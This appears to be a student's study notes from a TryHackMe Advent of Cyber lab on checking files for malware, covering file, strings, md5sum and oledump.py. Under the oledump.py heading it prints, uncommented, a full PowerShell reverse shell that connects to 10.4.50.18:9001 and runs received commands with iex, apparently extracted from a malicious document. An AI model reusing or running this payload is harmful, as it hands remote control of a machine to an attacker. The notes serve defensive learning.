From AdventofCyber3 tryhackme. This is several tools for checking file, its type, content or integrity. The lesson is for checking malware in file, but probably useful for other things.

## file
`file` command helps determine a file's file type, regardless of its extension.
```bash
file <filename>
```

## strings
extracts and prints printable character from file.
```bash
strings <filename>
strings <filename> strings_output.txt
```

## md5sum
calculate the MD5 hash of a file
```bash
md5sum <filename>
cat file | md5sum
```

## oledump.py
https://blog.didierstevens.com/programs/oledump-py/
a python script, to analize an OLE (Compound binary format) files like .doc, .xls, .ppt. Basically break down those type of files into their component.

```shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.4.50.18",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```